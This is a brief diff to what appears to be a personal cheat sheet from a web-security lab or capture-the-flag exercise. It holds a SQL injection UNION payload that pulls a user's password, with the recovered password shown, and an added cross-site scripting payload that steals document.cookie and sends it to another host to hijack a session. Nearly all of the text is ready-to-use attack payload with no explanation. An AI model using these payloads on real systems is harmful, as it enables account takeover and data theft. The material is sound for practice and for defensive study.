@@ -13,3 +13,8 @@ information_schema: table_schema, table_name
 
 ' OR 1=1 UNION SELECT pwd FROM Users WHERE username = 'unionguy' -- 
 -> sQL-iNJeCtion4EvERYonE
+
+
+# XSS Session hijacking
+
+<script>$.ajax({type: "GET", url: "http://dvwc.el.eee.intern/pomessage?message=" + document.cookie + "&from=alice&to=admin", success: (result) => {}});</script>
